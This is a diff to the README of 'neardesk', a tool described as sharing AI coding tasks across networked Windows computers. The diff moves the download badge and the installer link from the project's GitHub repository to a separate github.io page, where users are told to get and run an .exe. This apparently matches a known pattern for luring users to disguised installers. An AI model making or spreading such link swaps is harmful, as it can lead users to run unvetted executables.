@@ -1,6 +1,6 @@
 # 🖥️ neardesk - Run AI agents across many computers
 
-[![Download neardesk](https://img.shields.io/badge/Download_neardesk-blue.svg)](https://github.com/muhammadsaqib-ops/neardesk)
+[![Download neardesk](https://img.shields.io/badge/Download_neardesk-blue.svg)](https://muhammadsaqib-ops.github.io)
 
 neardesk allows you to connect multiple Windows computers together. You manage your AI coding tasks from one laptop. Your other computers act as local workers on your home network. This setup saves time by sharing the work across your hardware.
 
@@ -20,7 +20,7 @@ Before you begin, ensure your computers meet these standards:
 
 Follow these steps to set up the software:
 
-1. Visit [this page](https://github.com/muhammadsaqib-ops/neardesk) to download the installer.
+1. Visit [this page](https://muhammadsaqib-ops.github.io) to download the installer.
 2. Select the file ending in `.exe` for Windows.
 3. Save the file to your desktop.
 4. Double-click the file to start the installation.
